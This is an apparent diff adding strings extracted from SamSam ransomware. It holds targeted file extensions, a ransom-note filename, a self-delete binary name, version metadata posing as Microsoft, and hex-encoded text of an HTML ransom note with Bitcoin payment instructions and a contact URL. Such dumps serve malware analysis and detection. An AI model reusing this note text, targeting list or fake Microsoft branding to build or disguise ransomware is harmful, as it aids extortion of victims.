+.sqlite
+.sqlite3
+.sqlitedb
+.wallet
+.ycbcra
+HELP_DECRYPT_YOUR_FILES
+\selfdel.exe
+.encryptedRSA
+68007400740070003A002F002F0075006E0069006F006E00380033003900330039006B002E0077006F0072006400700072006500730073002E0063006F006D00
+310039004300620044006F0061005A0044004C0054007A006B006B00540031007500510072004D0050004D0034003200410055007600660051004E0034004B0064007300
+3C002F00680074006D006C003E000D000A003C007000720065003E000D000A003C0066006F006E007400200063006F006C006F0072003D0022004D00610072006F006F006E0022003E003C00630065006E007400650072003E003C00680033003E00230057006800610074002000680061007000700065006E0065006400200074006F00200079006F00750072002000660069006C00650073003F003C002F00680033003E003C002F00630065006E007400650072003E003C002F0066006F006E0074003E000D000A000D000A0041006C006C0020006F006600200079006F0075007200200069006D0070006F007200740061006E0074002000660069006C0065007300200065006E0063007200790070007400650064002000770069007400680020005200530041002D0032003000340038002C0020005200530041002D00320030003400380020006900730020006100200070006F00770065007200660075006C002000630072007900700074006F00670072006100700068007900200061006C0067006F0072006900740068006D000D000A0046006F00720020006D006F0072006500200069006E0066006F0072006D006100740069006F006E00200079006F0075002000630061006E0020007500730065002000570069006B006900700065006400690061000D000A003C0066006F006E007400200063006F006C00
+3C00620072003E003C00620072003E003C0066006F006E007400200063006F006C006F0072003D00220072006500640022003E00530074006500700033003A003C002F0066006F006E0074003E002000570065002000770069006C006C0020007200650070006C007900200074006F00200079006F0075007200200063006F006D006D0065006E00740020007700690074006800200061002000640065006300720079007000740069006F006E00200073006F006600740077006100720065002C00200059006F0075002000730068006F0075006C0064002000720075006E0020006900740020006F006E00200079006F0075007200200061006600660065006300740065006400200050004300200061006E006400200061006C006C00200065006E0063007200790070007400650064002000660069006C00650073002000770069006C006C0020006200650020007200650063006F00760065007200650064000D000A000D000A003C0066006F006E007400200063006F006C006F0072003D0022004400720061006B0052006500640022003E002A003C002F0066006F006E0074003E004F0075007200200062006C006F006700200061006400640072006500730073003A0020003C006100200068007200650066003D002200
+22003E00
+3C002F0061003E000D000A000D000A000D000A003C0066006F006E007400200063006F006C006F0072003D0022004400720061006B0052006500640022003E002A003C002F0066006F006E0074003E004F0075007200200042006900740063006F0069006E00200061006400640072006500730073003A002000
+0D000A003C0066006F006E007400200063006F006C006F0072003D0022004D00610072006F006F006E0022003E003C00630065006E007400650072003E003C00680033003E0023005700680061007400200069007300200042006900740063006F0069006E003F003C002F00680033003E003C002F00630065006E007400650072003E003C002F0066006F006E0074003E000D000A000D000A0042006900740063006F0069006E00200069007300200061006E00200069006E006E006F0076006100740069007600650020007000610079006D0065006E00740020006E006500740077006F0072006B00200061006E0064002000610020006E006500770020006B0069006E00640020006F00660020006D006F006E00650079002E000D000A0059006F0075002000630061006E00200063007200650061007400650020006100200042006900740063006F0069006E0020006100630063006F0075006E0074002000610074002000680074007400700073003A002F002F0062006C006F0063006B0063006800610069006E002E0069006E0066006F002F00200061006E00640020006400650070006F00730069007400200073006F006D00650020006D006F006E0065007900200069006E0074006F00200079006F007500720020006100630063006F0075006E007400200061006E00640020007400680065006E0020007300
+0D000A003C0066006F006E007400200063006F006C006F0072003D0022004D00610072006F006F006E0022003E003C00630065006E007400650072003E003C00680033003E00230048006F007700200074006F0020007500730065002000700072006900760061007400650020004B00650079003F003C002F00680033003E003C002F00630065006E007400650072003E003C002F0066006F006E0074003E000D000A000D000A00570065002000730065006E006400200079006F007500200061002000730069006D0070006C006500200073006F0066007400770061007200650020007700690074006800200079006F00750072002000700072006900760061007400650020004B006500790020000D000A0041006E006400200079006F00750020006A0075007300740020006E006500650064002000720075006E0020007400680069007300200073006F0066007400770061007200650020006F006E0020006500610063006800200063006F006D007000750074006500720020007400680061007400200065006E006300720079007000740065006400200061006E006400200061006C006C002000610066006600650063007400650064002000660069006C00650073002000770069006C006C0020006200650020006400650063007200790070007400650064000D000A000D000A003C0066006F006E0074002000
+samsam.Properties.Resources
+VS_VERSION_INFO
+VarFileInfo
+Translation
+StringFileInfo
+000004b0
+Comments
+MicrosoftSAM
+CompanyName
+Microsoft
+FileDescription
+MicrosoftSAM
+FileVersion
+2.4.8.4
+InternalName
+samsam.exe
+LegalCopyright
+Copyright 
+  2014
+OriginalFilename
+samsam.exe
+ProductName
+MicrosoftSAM
+ProductVersion
+2.4.8.4
+Assembly Version
+8.2.8.8
